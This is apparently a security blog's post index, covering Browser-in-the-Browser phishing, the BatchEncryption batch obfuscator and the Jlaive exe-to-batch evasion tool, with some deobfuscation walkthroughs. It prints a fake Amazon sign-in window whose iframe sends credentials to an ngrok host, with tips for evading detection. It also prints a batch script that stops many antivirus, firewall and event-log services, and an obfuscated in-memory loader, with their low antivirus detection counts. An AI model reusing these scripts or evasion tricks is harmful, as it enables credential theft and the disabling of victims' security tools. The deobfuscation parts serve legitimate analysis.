id=\u0026#34;logo-description\u0026#34;\u0026gt;Please log to your account.\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div\u0026gt; \u0026lt;span id=\u0026#34;minimize\u0026#34;\u0026gt;\u0026amp;#8212;\u0026lt;/span\u0026gt; \u0026lt;span id=\u0026#34;square\u0026#34;\u0026gt;□\u0026lt;/span\u0026gt; \u0026lt;span id=\u0026#34;exit\u0026#34;\u0026gt;✕\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div id=\u0026#34;url-bar\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;./ssl.svg\u0026#34; width=\u0026#34;20px\u0026#34; height=\u0026#34;20px\u0026#34; id=\u0026#34;ssl-padlock\u0026#34;\u0026gt; \u0026lt;span id=\u0026#34;domain-name\u0026#34;\u0026gt;https://www.amazon.com\u0026lt;/span\u0026gt; \u0026lt;span id=\u0026#34;domain-path\u0026#34;\u0026gt;/signin.html\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;!-- Content start --\u0026gt; \u0026lt;iframe id=\u0026#34;content\u0026#34; src=\u0026#34;https://44e5-46-177-73-144.ngrok-free.app\u0026#34; frameBorder=\u0026#34;0\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;script src=\u0026#34;script.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/html\u0026gt; The victim should now see the following window, which seems legitimate: Upon entering the credentials, we should see them in our server: We could also write code to forward the user to the real login of the website we mimiced and pass the given creds as parameters to avoid further suspicion.\nDefenses The way this attack was initially detected was by trying to drag the SSO window out of the browser window. If the SSO window was not able to escape the outter window, this meant that it was fake.\nLater on, a plugin came out that would identify such windows by the use of their iframes and warn users about this attack. This is done with a technique known as frame busting, a technique now used by most of the known browsers. This leads to BitB being heavily detected and can burn your phishing domain. In order to avoid BitB being detected, you must somehow heavily obfuscate/hide it.\nSo if we somehow managed to solve the defense mechanism that checks for iframes, we would have a successful BitB phishing attack, which brings us to the next section on how to implement this attack without iframes and with the help of evilginx.\nBitB without iframes In this technique, apache and evilginx is utilized alongside with many css and html tricks, avoiding the use of iframes and thus making a more complicated (\u0026ldquo;obfuscated\u0026rdquo;) approach that is not that easy to detect. As the developer of this developed technique stated in his github repo: Framebusters target iframes specifically, so the idea is to create the BITB effect without the use of iframes, and without disrupting the original structure/content of the proxied page. This can be achieved by injecting scripts and HTML besides the original content using search and replace (aka substitutions), then relying completely on HTML/CSS/JS tricks to make the visual effect. We also use an additional trick called \u0026ldquo;Shadow DOM\u0026rdquo; in HTML to place the content of the landing page (background) in such a way that it does not interfere with the proxied content, allowing us to flexibly use any landing page with minor additional JS scripts.\nThe result is a fully working, undetected to framebusters SSO window using the bitb technique:\nThere are many things going on in frameless BitB but Wael Masri does a great job explaining the ins and outs of this technique and how you could replicate it:\nReferences\n[1] Mr.d0x: Browser In The Browser (BITB) Attack [2] Cofense email security: Browser-in-the-Browser (BitB) Attack Takes Advantage of Single-Sign-On Trust [3] Infinite Logins: Browser in the Browser (BITB) Phishing Technique [3] Wael Masri: How To: Evilginx + BITB | Browser In The Browser without iframes in 2024 [4] waelmas: frameless-bitb ","permalink":"http://localhost:1313/posts/bitb/","summary":"What is the Browser-in-the-Browser attack BitB attack is a phishing technique displayed by mr.d0x that essentially abuses the Single-Sign-On (SSO) window and modifies the shown url of the popped-up window to seem like a legitimate one.\nBasically, the concept of this attack is to host a phishing website and inside the phishing website to create a legitimate looking SSO window (with a valid url) which is a phishing window as well.","title":"Browser-in-the-Browser (BitB) attack"},{"content":"What is the BatchEncryption tool The BatchEncryption tool is a tool used for obfuscating batch files. It is rather one of the most uncommon ones since it combines known and custom environment variable encodings to obfuscate the script. The way it works is it sets a randomly generated dictionary into a custom envar which is just a single quote (\u0026quot;\u0026rsquo;\u0026quot;). It then encodes it with existing environment variable substrings and then takes the remainder of the command using substrings of the custom environment variable declared previously.\nThe use of this tool was seen back in 2017 in the Jawlan and Suriya.doc (SHA-256: 761483906b45fad51f3c7ab66b1534dee137e93a52816aa270bc97249acb56d0) and has almost unknown at the time, with only 3 google search results. Now it has started to pop up more (mainly in .cn forums).\nAn example of a batch file obfuscated with BatchEncryption can be seen below:\nThe nice thing about this tool is that still in this day, it manages to get low AV detection in VT. Let\u0026rsquo;s take a .bat sample that disables multiple different AV engines:\nset ii=ne set ywe=st set ury=t set iej=op set jt53=Syma set o6t=nor set lyd2=fee set h3d=ton set gf45=ntec set own5=McA net stop \u0026#34;Security Center\u0026#34; /y net stop \u0026#34;Automatic Updates\u0026#34; /y net stop \u0026#34;Symantec Core LC\u0026#34; /y net stop \u0026#34;SAVScan\u0026#34; /y net stop \u0026#34;norton AntiVirus Firewall Monitor Service\u0026#34; /y net stop \u0026#34;norton AntiVirus Auto-Protect Service\u0026#34; /y net stop \u0026#34;norton AntiVirus Auto Protect Service\u0026#34; /y net stop \u0026#34;McAfee Spamkiller Server\u0026#34; /y net stop \u0026#34;McAfee Personal Firewall Service\u0026#34; /y net stop \u0026#34;McAfee SecurityCenter Update Manager\u0026#34; /y net stop \u0026#34;Symantec SPBBCSvc\u0026#34; /y cls net stop \u0026#34;Ahnlab Task Scheduler\u0026#34; /y net stop navapsvc /y net stop \u0026#34;Sygate Personal Firewall Pro\u0026#34; /y net stop vrmonsvc /y net stop MonSvcNT /y net stop SAVScan /y net stop NProtectService /y net stop ccSetMGR /y net stop ccEvtMGR /y net stop srservice /y net stop \u0026#34;Symantec Network Drivers Service\u0026#34; /y net stop \u0026#34;norton Unerase Protection\u0026#34; /y net stop MskService /y net stop MpfService /y net stop mcupdmgr.exe /y net stop \u0026#34;McAfeeAntiSpyware\u0026#34; /y net stop helpsvc /y net stop ERSvc /y net stop \u0026#34;*norton*\u0026#34; /y net stop \u0026#34;*Symantec*\u0026#34; /y net stop \u0026#34;*McAfee*\u0026#34; /y cls net stop ccPwdSvc /y net stop \u0026#34;Symantec Core LC\u0026#34; /y net stop navapsvc /y net stop \u0026#34;Serv-U\u0026#34; /y net stop \u0026#34;norton AntiVirus Auto Protect Service\u0026#34; /y net stop \u0026#34;norton AntiVirus Client\u0026#34; /y net stop \u0026#34;Symantec AntiVirus Client\u0026#34; /y net stop \u0026#34;norton AntiVirus Server\u0026#34; /y net stop \u0026#34;NAV Alert\u0026#34; /y net stop \u0026#34;Nav Auto-Protect\u0026#34; /y cls net stop \u0026#34;McShield\u0026#34; /y net stop \u0026#34;DefWatch\u0026#34; /y net stop eventlog /y net stop InoRPC /y net stop InoRT /y net stop InoTask /y cls net stop \u0026#34;norton AntiVirus Auto Protect Service\u0026#34; /y net stop \u0026#34;norton AntiVirus Client\u0026#34; /y net stop \u0026#34;norton AntiVirus Corporate Edition\u0026#34; /y net stop \u0026#34;ViRobot Professional Monitoring\u0026#34; /y net stop \u0026#34;PC-cillin Personal Firewall\u0026#34; /y net stop \u0026#34;Trend Micro Proxy Service\u0026#34; /y net stop \u0026#34;Trend NT Realtime Service\u0026#34; /y net stop \u0026#34;McAfee.com McShield\u0026#34; /y net stop \u0026#34;McAfee.com VirusScan Online Realtime Engine\u0026#34; /y net stop \u0026#34;SyGateService\u0026#34; /y net stop \u0026#34;Sygate Personal Firewall Pro\u0026#34; /y cls net stop \u0026#34;Sophos Anti-Virus\u0026#34; /y net stop \u0026#34;Sophos Anti-Virus Network\u0026#34; /y net stop \u0026#34;eTrust Antivirus Job Server\u0026#34; /y net stop \u0026#34;eTrust Antivirus Realtime Server\u0026#34; /y net stop \u0026#34;Sygate Personal Firewall Pro\u0026#34; /y net stop \u0026#34;eTrust Antivirus RPC Server\u0026#34; /y cls net stop netsvcs net stop spoolnt The VT result of this is the following:\n(I got to admin I was expecting more).\nNow let\u0026rsquo;s use the BatchEncryption tool to obfuscate our sample and load it again: In just a text editor we can\u0026rsquo;t really see what\u0026rsquo;s going on because of the encoding used, but if we load it for example in cyberchef, it gets converted to utf8 and thus we can see readable chars. Anyways, we can see that indeed a lot of stuff is going on. Custom, existing envars, caret symbol for extra obfuscation etc. We also notice a header on top, which is the author of the program (gwsbhqt@163.com). Let\u0026rsquo;s load it to VT and watch what happens:\nWe successfully reduced our results to only 3! For any of you wondering what would happen if we had removed the header of the author and load it again, it would give the same results.\nLet\u0026rsquo;s now see how we can deobfuscate samples obfuscated with this technique.\nBatch-Encryption-DeCoder Luckily for us, there is already a tool for this purpose, which can be found here:\nhttps://github.com/cnHopeStudio/Batch-Encryption-DeCoder We need to build this tool to get the final executable, which when run, gives us the original batch file:\nReferences\n[1] blackhat: Exploring the Depths\rof Cmd.exe Obfuscation and Detection Techniques\r[2] Amit: Recipient batch processing documents confused by BatchEncryption (version 201610)\r[3] gwsbhqt: [Original Tool][201610]BatchEncryption-BatchEncrying Encryption\r","permalink":"http://localhost:1313/posts/batchencryption/","summary":"What is the BatchEncryption tool The BatchEncryption tool is a tool used for obfuscating batch files. It is rather one of the most uncommon ones since it combines known and custom environment variable encodings to obfuscate the script. The way it works is it sets a randomly generated dictionary into a custom envar which is just a single quote (\u0026quot;\u0026rsquo;\u0026quot;). It then encodes it with existing environment variable substrings and then takes the remainder of the command using substrings of the custom environment variable declared previously.","title":"Exploring the BatchEncryption tool (and its deobfuscator) by gwsbhqt@163.com "},{"content":"What will this post be about This post will be about the Jlaive and Get-UnJlaive tools. I will not go into depth as there are other resources I will list that do a great job explaining more in depth of the ins and outs of these tools. This will just be an overview of the tools: How to obfuscate an executable with Jlaive and how to recover it using Get-UnJlaive.\nWhat is the Jlaive tool In short terms, Jlaive is a tool used to convert executables to undetectable .bat scripts for AV evasion. This tool is very similar to the well known BatCloak engine which was used to create such undetectable .bat scripts. As the scmagazine states \u0026hellip;Researchers tie BatCloak closely to another, now abandoned, BAT obfuscation tool called Jlaive\u0026hellip;Trend Micro said that the BatCloak engine is the core engine of Jlaive’s obfuscation algorithm, now repurposed. The BatCloak functionality is specifically tied to the instructions “LineObfuscation.cs and FileObfuscation.cs” used in the Jlaive crimeware.\nThere are many tools with similar goals, like the ScrubCrypt, but they are closed-source for better monetization and avoide the use of them from other cyber criminal groups. Anyway, lucky for us, we got a hold of the Jlaive tool and we are going to explore it in a simple poc executable.\nSimple poc The poc is nothing more than a MsgBox:\nusing System; using System.Collections.Generic; using System.Linq; using System.Text; using System.Threading.Tasks; using System.Windows.Forms; namespace pocHello { internal class Program { static void Main(string[] args) { MessageBox.Show(\u0026#34;just an msgbox as a poc\u0026#34;, \u0026#34;Message Box POC\u0026#34;, MessageBoxButtons.OK, MessageBoxIcon.Information); } } } After building the project, we simply run the tool and load our executable, choosing what features we would like the obfuscated .bat file to have:\nRunning the tool, we get a successful message:\nNavigating to the path where the .bat file was created, we are met with the following code:\n@echo off echo F|xcopy C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe \u0026#34;%~dp0%~nx0.exe\u0026#34; /y attrib +s +h \u0026#34;%~dp0%~nx0.exe\u0026#34; cls cd %~dp0 set \u0026#34;fENYbyZJkq=3IHsgcHVib\u0026#34; set \u0026#34;oMDpdCkaMN=k = [Syste\u0026#34; set \u0026#34;HlBoTjvPwk=6UdLqADvWw\u0026#34; \u0026amp;\u0026amp; set \u0026#34;TgmwRYHkmK=ucHV0Lkxlb\u0026#34; set \u0026#34;nVaFdaubIS=npolicy by\u0026#34; \u0026amp;\u0026amp; set \u0026#34;BIXBCNceka=gSUNyeXB0b\u0026#34; \u0026amp;\u0026amp; set \u0026#34;YNWXZHqJqc=gZ3MuRGlzc\u0026#34; set \u0026#34;tQIzxvQESC=GtleSwgYnl\u0026#34; \u0026amp;\u0026amp; set \u0026#34;XOhAfBkWmm=vert]::Fro\u0026#34; set \u0026#34;kLMTZqURfX=U), [Syste\u0026#34; \u0026amp;\u0026amp; set \u0026#34;qVRmUESgbg=$tIukXz = \u0026#34; \u0026amp;\u0026amp; set \u0026#34;saTMAKUycO=SBpbnB1dCw\u0026#34; \u0026amp;\u0026amp; set \u0026#34;KdmMRlyyEK=nlwdG9yLlR\u0026#34; \u0026amp;\u0026amp; set \u0026#34;PMyINOXuEO=GJ5dGVbXSB\u0026#34; set \u0026#34;FscnzUUuAC=::FromBase\u0026#34; set \u0026#34;BARCwvwdkW=-noprofile\u0026#34; \u0026amp;\u0026amp; set \u0026#34;vwRxWzGiFE=))).EntryP\u0026#34; set \u0026#34;sMNjHgEuTS=md0aCk7IGR\u0026#34; \u0026amp;\u0026amp; set \u0026#34;ZMFfhtZaCd=n $tIukXz;\u0026#34; \u0026amp;\u0026amp; set \u0026#34;NRBHbUNrkG=etString([\u0026#34; \u0026amp;\u0026amp; set \u0026#34;tNCgPVjCku=kID0gZGVjc\u0026#34; set \u0026#34;CDtNvqDvqL=ngth - 1];\u0026#34; \u0026amp;\u0026amp; set \u0026#34;ieHoPTyjEy=mBase64Str\u0026#34; \u0026amp;\u0026amp; set \u0026#34;rajcuUaXTP=m.IO.File]\u0026#34; \u0026amp;\u0026amp; set \u0026#34;ihrpBFSJkF=Gh5OyBwdWJ\u0026#34; \u0026amp;\u0026amp; set \u0026#34;ObqwUWcIse=yZXR1cm4gb\u0026#34; set \u0026#34;wrxnxJJZUi=10gY1VaaUJ\u0026#34; set \u0026#34;tPPsLfEmfH=ssembly]::\u0026#34; \u0026amp;\u0026amp; set \u0026#34;wYpmPrqEes=0ZW0uU2Vjd\u0026#34; \u0026amp;\u0026amp; set \u0026#34;PeMJlFunvD=%~nx0.exe \u0026#34; \u0026amp;\u0026amp; set \u0026#34;xRRkIyDKnV=GUgPSBDaXB\u0026#34; set \u0026#34;LguDwtEgTm=ing(\u0026#39;dXNpb\u0026#34; set \u0026#34;rBnjvHzCEC=SwgaXYpOyB\u0026#34; \u0026amp;\u0026amp; set \u0026#34;BwxNyGNeWs=and $NDmNb\u0026#34; \u0026amp;\u0026amp; set \u0026#34;NOLCAWkezL=XJpdHkuQ3J\u0026#34; \u0026amp;\u0026amp; set \u0026#34;JxakJbogEh=c212SWxpVX\u0026#34; set \u0026#34;avLgdUKvyf=System.Con\u0026#34; set \u0026#34;dzLmqrEuSn=Load([DuUJ\u0026#34; set \u0026#34;buYFlxnyag=mcgU3lzdGV\u0026#34; set \u0026#34;JrzOnKokrg=G8obXNvKTs\u0026#34; set \u0026#34;VKtWSAzekf=kaW5nTW9kZ\u0026#34; set \u0026#34;UDLwXXbfUO=eDefinitio\u0026#34; set \u0026#34;pZCqseAkqe=ext(\u0026#39;%~f0\u0026#39;).Split([Environment]::NewLine);$WWCkvU \u0026#34; set \u0026#34;bEuenIEGAB=ert]::From\u0026#34; set \u0026#34;evGNjFJkiq=::ReadAllT\u0026#34; set \u0026#34;EtpzUbnYkW=XRlRGVjcnl\u0026#34; set \u0026#34;rAJgHQskWM=3VzaW5nIFN\u0026#34; \u0026amp;\u0026amp; set \u0026#34;nUMBtoFYkK=yBNZW1vcnl\u0026#34; \u0026amp;\u0026amp; set \u0026#34;DlNUGnnsfJ=gTWVtb3J5U\u0026#34; \u0026amp;\u0026amp; set \u0026#34;tguYxsQeEG=hbmFnZWQgY\u0026#34; \u0026amp;\u0026amp; set \u0026#34;ZxsoDXEAmh=::cUZiBs([\u0026#34; set \u0026#34;rrBdlEgEiR=\u0026#34; \u0026amp;\u0026amp; set \u0026#34;yuBNvyTjWG=ieXRlW10gZ\u0026#34; \u0026amp;\u0026amp; set \u0026#34;EpkleGpiSQ=zLlBhZGRpb\u0026#34; \u0026amp;\u0026amp; set \u0026#34;hlfUYJcbnE=//github.c\u0026#34; \u0026amp;\u0026amp; set \u0026#34;JaaFxTqmkm=zKGJ5dGVbX\u0026#34; set \u0026#34;ovxvfokepJ=yA9IG5ldyB\u0026#34; \u0026amp;\u0026amp; set \u0026#34;NdBkzRUyNc=-Type -Typ\u0026#34; set \u0026#34;cECnVddQIO=gYWVzLk1vZ\u0026#34; set \u0026#34;JYdzLMkAMI=zdGVtLklPO\u0026#34; set \u0026#34;LIJyjYDhEO=mBase64Str\u0026#34; set \u0026#34;FQDboAlVkm=0cmVhbSBtc\u0026#34; \u0026amp;\u0026amp; set \u0026#34;CtISDxCuyg=$NDmNbk.Le\u0026#34; set \u0026#34;cPhgSHJFiE=laive\u0026#34; \u0026amp;\u0026amp; set \u0026#34;wOUbaaionW=8dQ=\u0026#39;), [S\u0026#34; set \u0026#34;TFqYzkUFKP=oZXJNb2RlL\u0026#34; \u0026amp;\u0026amp; set \u0026#34;XmJlbVCEeg=ybSBkZWNye\u0026#34; set \u0026#34;rsAojPyqqK=pass -comm\u0026#34; set \u0026#34;HjDUCECfuK=vY2soaW5wd\u0026#34; \u0026amp;\u0026amp; set \u0026#34;RLYjZdmUem=i5EaXNwb3N\u0026#34; set \u0026#34;JmcNfgjlkO=3IE1lbW9ye\u0026#34; set \u0026#34;wotBbJUCXp=28gPSBuZXc\u0026#34; set \u0026#34;ZMbsYBZiEq=S5QS0NTNzs\u0026#34; set \u0026#34;JWEGEWztyS=y5Db21wcmV\u0026#34; \u0026amp;\u0026amp; set \u0026#34;wYGjMTSRLU=G9zZSgpOyB\u0026#34; \u0026amp;\u0026amp; set \u0026#34;RZdMvuYUqn=tLlRleHQ7d\u0026#34; set \u0026#34;DDhHMvstEO=GljIHN0YXR\u0026#34; \u0026amp;\u0026amp; set \u0026#34;BLkZldvAHE=TdHJlYW0gb\u0026#34; \u0026amp;\u0026amp; set \u0026#34;HkRRYWZUWm=7IHZhciBnc\u0026#34; set \u0026#34;EvYPmaikjR=lY3J5cHRvc\u0026#34; \u0026amp;\u0026amp; set \u0026#34;NUGvGuKfkH=]] (\u0026#39;%*\u0026#39;)))\u0026#34; \u0026amp;\u0026amp; set \u0026#34;TiPQaNUyEk=om/ch2sh/J\u0026#34; \u0026amp;\u0026amp; set \u0026#34;mMQdKSFyum=yeXB0ZWQ7I\u0026#34; set \u0026#34;FFeCIpqPyy= -windowst\u0026#34; set \u0026#34;lYRjpzjmyM=mcgPSBQYWR\u0026#34; \u0026amp;\u0026amp; set \u0026#34;jEdNSXkuFv=oint.Invok\u0026#34; set \u0026#34;UeVhkuMOtk=XNpID0gbmV\u0026#34; set \u0026#34;reZEtGxrSh=y5EaXNwb3N\u0026#34; \u0026amp;\u0026amp; set \u0026#34;uPqpbVZyku=ystem.Conv\u0026#34; \u0026amp;\u0026amp; set \u0026#34;QbZOQhYmgk=Fw]::YWqYu\u0026#34; set \u0026#34;ljXHtMvGyf=jIHN0YXRpY\u0026#34; \u0026amp;\u0026amp; set \u0026#34;LulfiaLhEe=XNpbmcgU3l\u0026#34; set \u0026#34;GVtjxQXtOo=zc2lvbjt1c\u0026#34; set \u0026#34;EyEeayRkCp=m.Convert]\u0026#34; \u0026amp;\u0026amp; set \u0026#34;VTmkqOOkQh=5c3RlbS5JT\u0026#34; set \u0026#34;DJZvlJxSeK=flection.A\u0026#34; set \u0026#34;VrbuAavxUi=XQsIDAsIGl\u0026#34; \u0026amp;\u0026amp; set \u0026#34;ytnErceFKM=G9zZSgpOyB\u0026#34; set \u0026#34;WsBCQAkGPI=mFnZWQoKTs\u0026#34; \u0026amp;\u0026amp; set \u0026#34;ZeKpegxEqf=UZpbmFsQmx\u0026#34; \u0026amp;\u0026amp; set \u0026#34;fYjkFWUCLu=e($null, (\u0026#34; \u0026amp;\u0026amp; set \u0026#34;qbrRUujXDM=lKCk7IGFlc\u0026#34; \u0026amp;\u0026amp; set \u0026#34;TcbXekUkOV=Base64Stri\u0026#34; \u0026amp;\u0026amp; set \u0026#34;ryOJrbkGXw=ncy5Db3B5V\u0026#34; \u0026amp;\u0026amp; set \u0026#34;gBhbYMmkar=HWmlwU3RyZ\u0026#34; set \u0026#34;xFXbUXSqiH=hZXMuQ3JlY\u0026#34; set \u0026#34;jUxqxtJWwK=XB0b3IgPSB\u0026#34; set \u0026#34;cUNiABJEPG=64String(\u0026#39;\u0026#34; set \u0026#34;BYliuSSkds=E1lbW9yeVN\u0026#34; set \u0026#34;DgsMJGRBkW=kNCQzsgYWV\u0026#34; \u0026amp;\u0026amp; set \u0026#34;yxMQSdikCf=System.Con\u0026#34; \u0026amp;\u0026amp; set \u0026#34;pqydlkWvlv=yYW5zZm9yb\u0026#34; set \u0026#34;xmGqfoyigz=yYXkoKTsgf\u0026#34; \u0026amp;\u0026amp; set \u0026#34;mKWZuiSqkG= -executio\u0026#34; set \u0026#34;pWisjkyuvo=g]::UTF8.G\u0026#34; \u0026amp;\u0026amp; set \u0026#34;RdergtMaPv=3MgRHVVSkZ\u0026#34; \u0026amp;\u0026amp; set \u0026#34;FoeUHvtBeI=3RyZWFtKCk\u0026#34; set \u0026#34;PtbWQSaxkP=gYnl0ZVtdI\u0026#34; \u0026amp;\u0026amp; set \u0026#34;prlyUalgGj=, [string[\u0026#34; \u0026amp;\u0026amp; set \u0026#34;qfhEOMrfue=rem https:\u0026#34; set \u0026#34;EHNuBdghke=XNvLlRvQXJ\u0026#34; set \u0026#34;atzklLZikC=ieXRlcyk7I\u0026#34; set \u0026#34;VzZHdHfnkK=wdG9yKGtle\u0026#34; \u0026amp;\u0026amp; set \u0026#34;pbEQoHEFya=3Npb25Nb2R\u0026#34; set \u0026#34;wyIRpJUzUy=ng(\u0026#39;i9gKth\u0026#34; set \u0026#34;aRvucOwBMK=lLkRlY29tc\u0026#34; set \u0026#34;ZGtoXTmqEa=vert]::Fro\u0026#34; \u0026amp;\u0026amp; set \u0026#34;LBXFmXrGGk=yle hidden\u0026#34; \u0026amp;\u0026amp; set \u0026#34;PgpYWgnESr=SB9\u0026#39;));Add\u0026#34; \u0026amp;\u0026amp; set \u0026#34;jQJlvwKnUC=HVybiBkZWN\u0026#34; set \u0026#34;yutyGaKptk=pYyBieXRlW\u0026#34; set \u0026#34;NrVzEyZKxJ=gWVdxWXVPK\u0026#34; set \u0026#34;ElUeqoZkeB=5cHRvZ3Jhc\u0026#34; \u0026amp;\u0026amp; set \u0026#34;VqDUHkduHE=HJlc3MpOyB\u0026#34; \u0026amp;\u0026amp; set \u0026#34;bXuhcMQWEC=tc2kuRGlzc\u0026#34; \u0026amp;\u0026amp; set \u0026#34;wIkgxuqwSU=ieXRlcykge\u0026#34; \u0026amp;\u0026amp; set \u0026#34;BeUppPecxE=xt.Encodin\u0026#34; \u0026amp;\u0026amp; set \u0026#34;JXrPZaVOUG=G9zZSgpOyB\u0026#34; \u0026amp;\u0026amp; set \u0026#34;FclUyvUGNa=WVzID0gbmV\u0026#34; \u0026amp;\u0026amp; set \u0026#34;QQwGKBkSYC=WS5VvlzyRn\u0026#34; \u0026amp;\u0026amp; set \u0026#34;QSDzwOfsqN=saWMgY2xhc\u0026#34; \u0026amp;\u0026amp; set \u0026#34;nNEnadmgAy=SB7IEFlc01\u0026#34; set \u0026#34;ZSnQhDQxOJ=WFtKG1zaSw\u0026#34; set \u0026#34;hCSlczZEed=[System.Re\u0026#34; set \u0026#34;tAyNMEciUo=VN0cmVhbSh\u0026#34; \u0026amp;\u0026amp; set \u0026#34;lELXxFDard=O([DuUJFw]\u0026#34; set \u0026#34;nNsRHgWaoU== $NDmNbk[\u0026#34; set \u0026#34;ldbJMTqUaX=0ZVtdIGl2K\u0026#34; \u0026amp;\u0026amp; set \u0026#34;sSUxwkECwE=1RyYW5zZm9\u0026#34; \u0026amp;\u0026amp; set \u0026#34;IYUhcqkikI=1hMu1g==\u0026#39;)\u0026#34; set \u0026#34;rgNaXziIpC=GVjcnlwdGV\u0026#34; set \u0026#34;xdaAAuWEqb=3IEFlc01hb\u0026#34; \u0026amp;\u0026amp; set \u0026#34;TYDLSAjkyA=gQ29tcHJlc\u0026#34; \u0026amp;\u0026amp; set \u0026#34;GgmonIEaZP=ing($WWCkv\u0026#34; set \u0026#34;IArsKCeeLv=tc28uRGlzc\u0026#34; \u0026amp;\u0026amp; set \u0026#34;oLgiwxduaV=H0gcHVibGl\u0026#34; \u0026amp;\u0026amp; set \u0026#34;GNZxLtdDkO=[System.Te\u0026#34; set \u0026#34;amOerQZEai=OxhVVfEWSN\u0026#34; \u0026amp;\u0026amp; set \u0026#34;fHTMzMCrak=yBieXRlW10\u0026#34; set \u0026#34;kKopFOwikC=2luZyBTeXN\u0026#34; set \u0026#34;occQjttmnX=lKCk7IHJld\u0026#34; set \u0026#34;eZKAFlWkCV=MlVcdDTvXm\u0026#34; %qfhEOMrfue%%hlfUYJcbnE%%TiPQaNUyEk%%cPhgSHJFiE% %PeMJlFunvD%%BARCwvwdkW%%FFeCIpqPyy%%LBXFmXrGGk%%mKWZuiSqkG%%nVaFdaubIS%%rsAojPyqqK%%BwxNyGNeWs%%oMDpdCkaMN%%rajcuUaXTP%%evGNjFJkiq%%pZCqseAkqe%%nNsRHgWaoU%%CtISDxCuyg%%CDtNvqDvqL%%qVRmUESgbg%%GNZxLtdDkO%%BeUppPecxE%%pWisjkyuvo%%NRBHbUNrkG%%avLgdUKvyf%%ZGtoXTmqEa%%LIJyjYDhEO%%LguDwtEgTm%%buYFlxnyag%%RZdMvuYUqn%%LulfiaLhEe%%JYdzLMkAMI%%rAJgHQskWM%%VTmkqOOkQh%%JWEGEWztyS%%GVtjxQXtOo%%kKopFOwikC%%wYpmPrqEes%%NOLCAWkezL%%ElUeqoZkeB%%ihrpBFSJkF%%QSDzwOfsqN%%RdergtMaPv%%fENYbyZJkq%%DDhHMvstEO%%yutyGaKptk%%wrxnxJJZUi%%JaaFxTqmkm%%saTMAKUycO%%PtbWQSaxkP%%tQIzxvQESC%%ldbJMTqUaX%%nNEnadmgAy%%tguYxsQeEG%%FclUyvUGNa%%xdaAAuWEqb%%WsBCQAkGPI%%cECnVddQIO%%xRRkIyDKnV%%TFqYzkUFKP%%DgsMJGRBkW%%EpkleGpiSQ%%lYRjpzjmyM%%VKtWSAzekf%%ZMbsYBZiEq%%BIXBCNceka%%sSUxwkECwE%%XmJlbVCEeg%%jUxqxtJWwK%%xFXbUXSqiH%%EtpzUbnYkW%%VzZHdHfnkK%%rBnjvHzCEC%%yuBNvyTjWG%%rgNaXziIpC%%tNCgPVjCku%%KdmMRlyyEK%%pqydlkWvlv%%ZeKpegxEqf%%HjDUCECfuK%%VrbuAavxUi%%TgmwRYHkmK%%sMNjHgEuTS%%EvYPmaikjR%%RLYjZdmUem%%qbrRUujXDM%%reZEtGxrSh%%occQjttmnX%%jQJlvwKnUC%%mMQdKSFyum%%oLgiwxduaV%%ljXHtMvGyf%%fHTMzMCrak%%NrVzEyZKxJ%%PMyINOXuEO%%wIkgxuqwSU%%nUMBtoFYkK%%BLkZldvAHE%%UeVhkuMOtk%%JmcNfgjlkO%%tAyNMEciUo%%atzklLZikC%%BYliuSSkds%%FQDboAlVkm%%wotBbJUCXp%%DlNUGnnsfJ%%FoeUHvtBeI%%HkRRYWZUWm%%ovxvfokepJ%%gBhbYMmkar%%ZSnQhDQxOJ%%TYDLSAjkyA%%pbEQoHEFya%%aRvucOwBMK%%VqDUHkduHE%%ryOJrbkGXw%%JrzOnKokrg%%YNWXZHqJqc%%JXrPZaVOUG%%bXuhcMQWEC%%wYGjMTSRLU%%IArsKCeeLv%%ytnErceFKM%%ObqwUWcIse%%EHNuBdghke%%xmGqfoyigz%%PgpYWgnESr%%NdBkzRUyNc%%UDLwXXbfUO%%ZMFfhtZaCd%%hCSlczZEed%%DJZvlJxSeK%%tPPsLfEmfH%%dzLmqrEuSn%%QbZOQhYmgk%%lELXxFDard%%ZxsoDXEAmh%%yxMQSdikCf%%XOhAfBkWmm%%ieHoPTyjEy%%GgmonIEaZP%%kLMTZqURfX%%EyEeayRkCp%%FscnzUUuAC%%cUNiABJEPG%%HlBoTjvPwk%%QQwGKBkSYC%%JxakJbogEh%%eZKAFlWkCV%%wOUbaaionW%%uPqpbVZyku%%bEuenIEGAB%%TcbXekUkOV%%wyIRpJUzUy%%amOerQZEai%%IYUhcqkikI%%vwRxWzGiFE%%jEdNSXkuFv%%fYjkFWUCLu%%prlyUalgGj%%NUGvGuKfkH% %rrBdlEgEiR% attrib -s -h \u0026#34;%~dp0%~nx0.exe\u0026#34; del \u0026#34;%~dp0%~nx0.exe\u0026#34;(goto) 2\u0026gt;nul \u0026amp; del \u0026#34;%~f0\u0026#34; exit /b jjNNb7+5GJxTidTZUiwqq6EMDNO1MKBC21fz5d08N7l -- a bunch more of b64 encrypted bytes --- A great resource explaining the commands used in the batch file is a post made by Jose Luis Sánchez Martínez in his blog (which I will leave in the references). He gives an overview of what calls are being made when we execute this obfuscated .bat file and also a poc of rules to detect such malicious files (although, they could be bypassed).\nRunning this batch script gives the same output as our original executable:\nAfter we run this, the .bat file gets deleted - well, its contents gets deleted - and a new file, with an .exe extension appears to have been created:\nThis is where the tool Get-UnJlaive will come into play, which will take advantage of this and manage to deobfuscate the script and give the original .exe code.\nGet-UnJlaive Now onto the deobfuscation part. Get-UnJlaive is a tool able to reconstruct Jlaive (.NET Antivirus Evasion Tool (Exe2Bat)) to original Assembly and stub Assembly, as the author states. We are going to use his tool which can be found in the following repo (also has an amazing channel which I will leave in the references):\nhttps://github.com/Dump-GUY/Get-UnJlaive Basically what this tool does is to run the .bat file, set it in a suspended state to get the deobfuscated form (as we previously saw, a .exe was created after we had run the .bat), decrypt it, reconstruct the original assembly and then terminates it. For an indepth analysis of how this tool works, you can watch the video of dumpguy which I\u0026rsquo;ll leave in the references.\nReconstructing the original assembly The tool is easy to set. You simple just open a powershell terminal, load the module provided and you are good to go. After you run the tool, you should get a file with an extension \u0026ldquo;.bat_orig.exe\u0026rdquo; which you could load into DnSpy for example and view its code: Aaand we have successfully reconstructed our original .exe from the obfuscated 